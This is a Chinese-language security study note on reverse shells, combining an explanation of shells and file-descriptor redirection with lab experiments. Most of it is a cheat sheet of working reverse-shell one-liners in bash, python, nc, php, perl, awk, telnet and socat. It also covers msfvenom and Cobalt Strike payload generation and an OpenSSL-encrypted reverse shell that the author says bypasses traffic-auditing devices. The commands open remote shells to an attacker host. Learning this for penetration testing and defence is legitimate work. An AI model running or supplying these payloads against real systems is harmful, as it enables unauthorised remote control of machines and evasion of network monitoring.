---
title: "网安笔记 - 知识补充 - 反弹shell"
category: "网安笔记"
date: 2026-04-09
published: 2026-04-09
author: "Rin"
---

反弹shell
知识铺垫
什么是shell
shell是渗透中常用的名词，像getshell，webshell，反弹shell等等，都和shell相关。

getshell：获取到目标的命令执行权限
webshell：指网站后门，通过web服务进行命令执行
反弹shell：把命令行的输入输出转移到其它主机
Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。
![](https://i-blog.csdnimg.cn/blog_migrate/dd0b00af99ee31fa42925d60f01af398.png)


shell的功能是什么
shell用来接收我们用户的输入，并且解释我们的命令。然后将其传给系统内核，内核再调用硬件来操作。

什么是反弹shell
反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

为什么要反弹shell
通常用于被控端因防火墙受限、权限不足、端口被占用等情形。
举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？
有如下情况：

某客户机中了你的网马，但是它在局域网内，你直接连接不了。
目标机器的ip动态改变，你不能持续控制。
由于防火墙等限制，对方机器只能发送请求，不能接收请求。
对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，
webshell下执行命令不交互，为了方便提权或其它操作必须要反弹shell。
反弹shell相当于新增一个后门，当webshell被发现删除后权限不会丢失。
所以建立一个服务端让恶意程序主动连接，才是上策。
那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

常用linux反弹shell的方式
实验环境，一台CentOS7(受害者)，一台win7（受害者），一台kali(进攻者)

使用whereis命令去确定目标支持的反弹方法

```bash
whereis nc bash python php exec lua perl ruby
```
![](https://i-blog.csdnimg.cn/blog_migrate/3c9bf297bdf4db1f15f3a3c0b6e7817b.png#pic_center)


bash反弹shell
bash反弹是实战中用的最多的方法
![](https://i-blog.csdnimg.cn/blog_migrate/6747886651608c748fc4402631516631.png#pic_center)




```bash
攻击者：nc -lvp 9999

受害者：bash -i >& /dev/tcp/192.168.239.128/9999 0>&1
```

命令释义
nc -lvp 9999

```bash
nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-l 监听模式，用于入站连接
-v 详细输出--用两个-v可得到更详细的内容
-p port 本地端口号
```

bash -i >& /dev/tcp/192.168.239.128/9999 0>&1

```bash
bash -i代表在本地打开一个bash
>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出

```

linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：
0 - stdin 代表标准输入,使用<或<<
1 - stdout 代表标准输出,使用>或>>
2 - stderr 代表标准错误输出,使用2>或2>>

还有就是>&这个符号的含义，最好的理解是这样的：

```txt
当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。
当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符
```

原理
bash -i >& /dev/tcp/192.168.239.128/9999 0>&1：
bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在CentOS输入命令，输出以及错误输出的内容就会被传递显示到kali上面。如下面的GIF所示
![](https://i-blog.csdnimg.cn/blog_migrate/abe5ed37e50d91cd0afd196828afdeb8.gif#pic_center)

在/dev/tcp/ip/port后面加上0>&1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了。
那么，0>&2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程。

为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向：
![](https://i-blog.csdnimg.cn/blog_migrate/6fa084ffc057333f0e9ebdaf3bc3ae0a.png)


执行bash -i >& /dev/tcp/ip/port后
	![](https://i-blog.csdnimg.cn/blog_migrate/b408f08dcc2e8bb013f1e8821bbf225e.png)
执行bash -i >& /dev/tcp/ip/port 0>&1或者bash -i >& /dev/tcp/ip/port 0>&2后：
![](https://i-blog.csdnimg.cn/blog_migrate/8059af228d8f5b75cae5e9c6e5f42218.png)


python反弹shell
反弹的命令如下：

```bash
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

攻击者：nc -lvp 7777

```bash
攻击者：nc -lvp 7777

受害者：python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.239.128',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

```

![](https://i-blog.csdnimg.cn/blog_migrate/db7bb5f86a93e8606a2c3b827c246681.png)

原理
首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符。于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了。

nc反弹shell
需要目标主机安装了nc

```bash
攻击者：nc -lvp 4566

受害者：nc -e /bin/bash 192.168.239.128 4566

```

![](https://i-blog.csdnimg.cn/blog_migrate/ba6149e5112ff0d2ff5d5ec09c761860.png#pic_center)

```bash
攻击者：nc -lvp 4444

受害者：nc -e /bin/sh 192.168.239.128 4444

```

![](https://i-blog.csdnimg.cn/blog_migrate/f62fc21ec7ba93754e7d0e4844624df0.png#pic_center)

原理
nc -e /bin/bash 192.168.239.128 4566

```bash
-e prog 程序重定向，一旦连接，就执行
```

这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。

其他：
注意之前使用nc监听端口反弹shell时都会有一个警告：192.168.239.130: inverse host lookup failed: Unknown host根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。

![](https://i-blog.csdnimg.cn/blog_migrate/74a87a2bcfd19e852cb9bc651a280c2f.png#pic_center)


php反弹
首先最简单的一个办法，就是使用php的exec函数执行反弹shell
（需要php关闭safe_mode选项，才可以使用exec函数）

```bash
攻击者：nc -nvlp 9875

受害者：php -r 'exec("/usr/bin/bash -i >& /dev/tcp/192.168.239.128/9875 0>&1");'
```

![](https://i-blog.csdnimg.cn/blog_migrate/6617fcd4bc899edbe3d38440cdcadc95.png#pic_center)

一些变形

```bash
攻击者：nc -nvlp 4986

php -r '$sock=fsockopen("192.168.239.128",4986);exec("/bin/bash -i <&3 >&3 2>&3");'
```

![](https://i-blog.csdnimg.cn/blog_migrate/c7e5bfd3e4831a5356d611864689b3ee.png#pic_center)

exec反弹

```bash
攻击者：nc -nvlp 5623

受害者：0<&196;exec 196<>/dev/tcp/192.168.239.128/5623; sh <&196 >&196 2>&196
	
```

![](https://i-blog.csdnimg.cn/blog_migrate/8708dc6e126955d00dd2dcd238f0e244.png#pic_center)

perl反弹
```bash
攻击者：nc -nvlp 5623

受害者：perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

![](https://i-blog.csdnimg.cn/blog_migrate/ddebc5f7434f07f4ba1702103977adef.png#pic_center)

awk反弹
```bash
攻击者：nc -nvlp 5623

受害者：awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

```

![](https://i-blog.csdnimg.cn/blog_migrate/556c2e0dbcb0516d34b5a9dc03ebebe3.png#pic_center)

telnet反弹
需要在攻击主机上分别监听4567和7654端口，执行反弹shell命令后，在4567终端输入命令，7654查看命令执行后的结果

```bash
攻击者：
nc -nvlp 4567		#输入命令
nc -nvlp 7654		#输出命令

受害者：
telnet 192.168.239.128 4567 | /bin/bash | telnet 192.168.239.128 7654

```

![](https://i-blog.csdnimg.cn/blog_migrate/8359420d7eba6e9cf55093b99b7e9f44.png#pic_center)

socat反弹

```bash
攻击者：nc -nvlp 8989

受害者：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.239.128:8989

```

![](https://i-blog.csdnimg.cn/blog_migrate/b0d4baee36293e71a04d0461133ba932.png#pic_center)

windows反弹shell
nc反弹shell
攻击者：
nc -lvp 8989

受害者：
1：netcat 下载：[https://eternallybored.org/misc/netcat/]
2：解压后的文件夹里面，按住shift键的同时，在文件夹的空白处鼠标右键打开一个命令窗口
3：输入nc 192.168.239.128 8989 -e c:\windows\system32\cmd.exe

![](https://i-blog.csdnimg.cn/blog_migrate/9afde5e3ba38b46a45862e5a883dc538.png#pic_center)

MSF反弹
使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload

```bash
msfvenom -l payloads | grep 'cmd/windows/reverse'

```

生成命令

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.40.146 LPORT=4444

```

![](https://i-blog.csdnimg.cn/blog_migrate/a0dfcd0b58c7030263330aa4ac77b75a.png#pic_center)

然后MSF启动监听

![](https://i-blog.csdnimg.cn/blog_migrate/8b4880037d3df52702b401fb605b8ff3.png#pic_center)

复制前面通过msfvenom生成的恶意代码到win7的cmd中执行即可。
警告：有的文章说的是把那段恶意代码放到powershell中执行是不对的，也不能拿到session，至少我验证的结果是把代码放在cmd下执行才拿到session！

CS主机上线
cs服务器在kali上面启动

```bash
sudo chmod +x teamserver
sudo ./teamserver 192.168.243.128 123456

```

cs客户机在kali上面启动

```bash
sudo chmod +x start.sh
./start.sh

```

![](https://i-blog.csdnimg.cn/blog_migrate/37c7433ae67a5bb23c5a44eb8b6a247f.png#pic_center)
![](https://i-blog.csdnimg.cn/blog_migrate/2e1811524fa38ef043885dfd6eb1274f.png#pic_center)

CS会生成一条命令，复制下来，在powershell中执行即可

![](https://i-blog.csdnimg.cn/blog_migrate/f6eb8512e9d099ff592a0efaf35a22dc.png#pic_center)

交互式shell
通过上述命令反弹shell得到的shell并不能称为完全交互的shell，通常称之为’哑’shell。
通常存在以下缺点

ctrl-c会中断会话
无法正常使用vim等文本编辑器
没有向上箭头使用历史
无法执行交互式命令
无法查看错误输出
无法使用 tab 命令补全
无法操控jobcontrol
因此有必要去获取一个完全交互的shell，方法就是在shell 中执行python，使用pty模块，创建一个原生的终端。下面提供两条命令，主要是因为有的机器可能是python2，有的是3，好比我这里使用3版本失败后，使用版本就ok了。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

```

![](https://i-blog.csdnimg.cn/blog_migrate/ce33ee7c9e046bb5833cc330bc1f278c.png#pic_center)

流量加密
部分防护设备会对内外网传输流量进行审查，反弹shell执行命令都是以明文进行传输的，很容易被查杀。
因此需要将原始流量使用 openssl 加密，绕过流量审计设备。
1、首先kali上生成SSL证书的公钥/私钥对,信息懒得填，一直回车即可。

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

```
2、kali使用 OpenSSL 监听一个端口

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888

```
3、目标主机执行反弹加密shell

```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ip:port > /tmp/s; rm /tmp/s

```

![](https://i-blog.csdnimg.cn/blog_migrate/fcb13f0380ba40b7ef729a2d8d347ff3.png#pic_center)

下面来看整个过程中抓到的流量包，是TLS加密的

![](https://i-blog.csdnimg.cn/blog_migrate/f7dc8b7788d15fc8b6c6e1d570bb0791.jpeg#pic_center)


---
### 反弹shell简单理解
**什么是[反弹shell](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=%E5%8F%8D%E5%BC%B9shell&zhida_source=entity)？**

　　反弹shell（[reverse shell](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=reverse+shell&zhida_source=entity)），就是控制端监听在某[TCP/UDP端口](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=TCP%2FUDP%E7%AB%AF%E5%8F%A3&zhida_source=entity)，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

**为什么要反弹shell？**

通常用于被控端因防火墙受限、权限不足、端口被占用等情形。

举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？

有如下情况：

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2.目标机器的ip动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

```text
参考：
https://www.zhihu.com/question/24503813   
```

**反弹shell实验**

环境：两台[CentOS7.6](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=CentOS7.6&zhida_source=entity)服务器

- 攻击端 hacker：10.201.61.194
- 受害端 victim：10.201.61.195

1. 攻击端监听一个端口：

```text
[root@hacker ~]# nc -lvp 6767
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::6767
Ncat: Listening on 0.0.0.0:6767
```

2.受害端生成一个反弹shell：

[root@victim ~]# **bash -i >& /dev/tcp/10.201.61.194/6767 0>&1**

3.攻击端已获取到受害端的bash：

```text
[root@hacker ~]# nc -lvp 6767
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::6767
Ncat: Listening on 0.0.0.0:6767
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:46836.
[root@victim ~]#         //攻击端已获得受害端的远程交互式shell
[root@victim ~]# hostname
hostname
victim
```

**解释：**

1. nc -lvp 6767

-l 监听，-v 输出交互或出错信息，-p 端口。nc是[netcat](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=netcat&zhida_source=entity)的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。

2. bash -i

-i interactive。即产生一个交互式的shell（bash）。  

3. /dev/tcp/IP/PORT

特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 `bash` 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。

**通过以下4个小测试来分析反弹shell实现过程：**

（PS: 注意执行步骤顺序）

**测试1：**

受害端：

```text
[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566        //第二步
[root@victim ~]# hostname        //第三步
[root@victim ~]#

攻击端：

[root@hacker ~]# nc -lvp 5566      //第一步

Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:49018.

victim      //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。
```

**测试2：**

受害端：

```text
[root@victim ~]# bash -i < /dev/tcp/10.201.61.194/5566        //第二步
[root@victim ~]# hostname        //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。
victim

 攻击端：

[root@hacker ~]# nc -lvp 5566        //第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:50412.
hostname        //第三步（攻击端执行命令）
```

**测试3**：

受害端：

```text
[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1        //第二步
[root@victim ~]# hostname        //受害端回显命令
[root@victim ~]# id        //受害端回显命令
[root@victim ~]# hahaha        //受害端回显命令
bash: hahaha: command not found        //受害端回显命令。显示错误命令的输出。
[root@victim ~]#

 攻击端：

[root@hacker ~]# nc -lvp 5566        //第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:36792.
hostname        //第三步（攻击端执行命令）
victim
id        //第四步（攻击端执行命令）
uid=0(root) gid=0(root) groups=0(root)
hahaha        //第五步（执行一个错误的命令）

//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。
```

**测试4**（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）：

```text
受害端：

[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1 2>&1        //第二步。或 # bash -i &> /dev/tcp/10.201.61.194/5566 0>&1  （注：&>或>& 表示混合输出，即标准输出1 + 错误输出2）

攻击端：

[root@hacker ~]# nc -lvp 5566        //第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:51182.
[root@victim ~]# hostname        //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~
hostname
victim

//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用~~~
```

**总结**：

本文整理了反弹shell的一些资料并通过实验理解反弹shell原理。深入理解[文件描述符](https://zhida.zhihu.com/search?content_id=118885941&content_type=Article&match_order=1&q=%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6&zhida_source=entity)和重定向才能更好弄懂反弹shell~

```text
参考：

https://xz.aliyun.com/t/2549   先知社区：Linux 反弹shell（二）反弹shell的本质
https://www.freebuf.com/articles/system/153986.html   FREEBUF：浅析重定向与反弹Shell命令
```




---
shell命令一键生成
[[~]#棱角 ::Edge.Forum*](https://forum.ywhack.com/shell.php)

反弹shell最全解析
[反弹Shell，看这一篇就够了-先知社区](https://xz.aliyun.com/news/8987)